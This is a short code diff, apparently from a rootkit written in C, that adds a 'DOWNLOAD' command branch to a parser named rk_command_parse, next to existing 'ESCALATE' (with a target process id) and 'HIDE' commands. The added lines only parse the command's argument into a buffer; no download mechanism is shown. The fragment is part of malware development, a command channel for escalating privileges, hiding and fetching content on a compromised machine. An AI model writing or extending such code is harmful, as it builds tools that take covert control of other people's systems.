@@ -197,6 +197,13 @@ int rk_command_parse(const unsigned char *bytes, size_t length,
 				  &parsed.escalate_pid))
 			return -EINVAL;
 		parsed.kind = RK_COMMAND_ESCALATE;
+	} else if (length > 9 && !memcmp(bytes, "DOWNLOAD ", 9)) {
+		parsed.kind = RK_COMMAND_DOWNLOAD;
+		if (rk_parse_hide_value(bytes + 9, length - 9,
+					parsed.hide_value,
+					sizeof(parsed.hide_value),
+					&parsed.hide_value_length))
+			return -EINVAL;
 	} else if (length >= 5 && !memcmp(bytes, "HIDE ", 5)) {
 		if (rk_try_hide(bytes, length, &parsed))
 			return -EINVAL;
